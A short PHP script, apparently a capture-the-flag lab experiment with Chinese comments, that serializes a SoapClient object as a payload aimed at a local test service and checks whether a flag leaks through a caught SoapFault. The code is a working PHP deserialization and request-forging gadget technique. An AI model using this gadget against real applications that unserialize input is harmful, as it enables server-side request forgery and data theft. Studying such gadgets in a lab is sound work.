<?php
// 实验：SoapClient 打 fault 回旗的服务，看异常里能不能接到 flag
$payload = serialize(new SoapClient(null, array(
    'uri'      => 'http://127.0.0.1:8094/',
    'location' => 'http://127.0.0.1:8094/test_fault.php',
)));
echo "弹药：", $payload, "\n";
$obj = unserialize($payload);
try {
    $result = $obj->health_check();
    echo "没有抛异常，返回值：\n";
    var_dump($result);
} catch (SoapFault $e) {
    echo "SoapFault 接住了！\n";
    echo "  getMessage(): ", $e->getMessage(), "\n";
    echo "  faultstring: ", var_export(@$e->faultstring, true), "\n";
    echo "  faultcode:   ", var_export(@$e->faultcode, true), "\n";
}
